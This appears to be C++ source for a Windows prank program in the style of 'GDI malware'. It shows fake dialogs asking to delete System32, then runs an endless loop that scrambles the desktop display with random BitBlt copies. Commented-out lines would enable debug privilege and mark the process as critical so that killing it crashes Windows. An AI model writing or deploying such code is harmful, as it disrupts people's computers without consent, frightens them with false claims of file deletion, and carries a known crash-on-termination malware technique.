


//#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <wingdi.h>
#include <windowsx.h>
#pragma comment(lib, "ntdll.lib")
// #include <wingdi.h>

// int width = GetSystemMetrics(SM_CXSCREEN);
// int height = GetSystemMetrics(SM_CYSCREEN);
// 
// COLORREF invert_color(COLORREF color) {
//     return RGB(~GetRValue(color), ~GetGValue(color), ~GetBValue(color));
// }
// 
// void InvertColors(HDC hdc) {
//     for (int x = 0; x < width; x++) {
//         for (int y = 0; y < height; y++) {
//             COLORREF color = GetPixel(hdc, x, y);
//             SetPixel(hdc, x, y, invert_color(color));
//         }
//     }
// }


// Draw text on the screen
void DrawText(HDC hdc, int x, int y, const wchar_t* text)
{
    SetTextAlign(hdc, TA_LEFT | TA_TOP);
    TextOut(hdc, x, y, text, wcslen(text));
}


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);


void InvertRect(int x, int y, int width, int height) {
    HDC hdc = GetDC(GetConsoleWindow());
    HRGN hRgn = CreateRectRgn(x, y, x + width, y + height);
    InvertRgn(hdc, hRgn);
    //DeleteObject(hRgn);
    ReleaseDC(GetConsoleWindow(), hdc);
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine,_In_ int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    BOOLEAN bl;
    ULONG BreakOnTermination;
    NTSTATUS status;

    // if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &bl)))
    // {
    //     std::cout << "Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.";
    //     return 1;
    // }

    //BreakOnTermination = 1;
    //status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));


    ask:
    int response = MessageBoxA(NULL, "Do you want to delete System32 ?             ", "Important question", MB_ICONQUESTION | MB_YESNO);
    if (response == IDYES) {
        MessageBoxA(NULL, "Deleting...            ", "Deleting System32", MB_ICONWARNING | MB_OK);
    }
    else {
        MessageBoxA(NULL, "I don't care            ", "Bruh", MB_ICONWARNING | MB_OK);
        goto ask;
    }

       //while (true) {
       //    InvertRect(0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
       //    Sleep(100);
       //
       //  
       //}

    while (true) {
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);
        RECT rekt;
        GetWindowRect(hwnd, &rekt);

        int x1 = rand() % (rekt.right - 100);
        int y1 = rand() % (rekt.bottom - 100);
        int x2 = rand() % (rekt.right - 100);
        int y2 = rand() % (rekt.bottom - 100);
        int width = rand() % 600;
        int height = rand() % 600;

        BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
        ReleaseDC(hwnd, hdc);
    }
        
    //    HDC hdc = GetDC(GetDesktopWindow());
    //    InvertColors(hdc);
    //  
    //    ReleaseDC(GetDesktopWindow(), hdc);
    //    Sleep(100);
    

    return 0;
}